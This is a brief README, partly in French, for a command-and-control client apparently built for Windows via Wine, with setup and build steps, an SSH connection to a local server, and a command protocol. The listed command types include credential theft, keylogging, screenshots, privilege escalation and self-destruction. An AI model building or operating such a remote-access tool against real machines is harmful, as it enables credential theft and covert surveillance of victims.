# Client C2 Documentation

## Dev Setup

### Install Wine
```bash
# Installer Wine via Homebrew
brew install --cask wine-stable

# Télécharger Python Windows 3.9.13 (dernière version avec installateur Windows)
wget https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe
wine python-3.9.13-amd64.exe /quiet InstallAllUsers=1 PrependPath=1
```

## Build the executable
```bash
./build.sh
```

### Run the executable
```bash
wine dist/Amine.exe
```

### Clear data of an agent
```bash
curl -X DELETE http://localhost:8000/clients/"ip_agent"/logs
```

## Agent details

initialize the connection to the server :
```bash
ssh joey@localhost -p 2222 -T "READY"
```
on server in input you can send commands to the client:
```bash
<type> <payload>
```

client return instructions "type payload" + result in one line.

type can be :
- CMD
- SHELL
- CREDS 
- KEYLOGGER
- SCREENSHOT
- RDP
- PRIVESC
- EXIT
- DESTROY

payload is the content...

